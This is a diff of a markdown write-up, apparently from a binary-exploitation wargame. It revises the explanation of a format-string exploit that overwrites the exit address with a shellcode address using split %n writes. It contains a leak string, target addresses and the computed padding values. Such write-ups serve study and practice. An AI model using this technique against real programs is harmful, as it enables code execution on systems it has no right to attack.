@@ -60,21 +60,22 @@ aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%
 - The shellcode address(0xffffdeae) in decimal is 4294958766 
 
 - Our number of bytes to be printed(4294958766) is too big to be printed in a single destintation 
-=> we need to split the bytes in two addresses :
+=> we need to split the bytes in two addresses (full explanations by Alexandre Cheron : https://axcheron.github.io/exploit-101-format-strings/)
 
-exit addresss : \xe0\x97\x04\x08
-\xe0\x97\x04\x08 + 2 = 0x080497e0 + 2 = \xe2\x97\x04\x08
-
-we split our shellcode address in the two adresses :
-0xffffdeae => 0xffff + 0xdeae
+- we split our shellcode address in the two adresses :
+0xffffdeae => 0xffff (high order bytes) + 0xdeae (low order bytes)
 
 decimal values :
 0xffff => 65535
 0xdeae => 57006 
 
 first value is : 57006 - 8 = 56998
-
 second value is : 65535 - 56998 - 8 = 8529
+
+- Low order bytes must be written first at destination address then high order bytes at destination address + 2
+
+exit address : \xe0\x97\x04\x08
+exit address + 2 : \xe0\x97\x04\x08 + 2 = 0x080497e0 + 2 = \xe2\x97\x04\x08
 
 - The exploit string will be formatted like that : 
 `<destination addr> + <destination addr + 2> + %<value in decimal2 - 2 two addresses length (8)>d + %10$n + %<value in decimal1 - value in decimal2 - 2 two addresses length (8)>d + %11$n` :
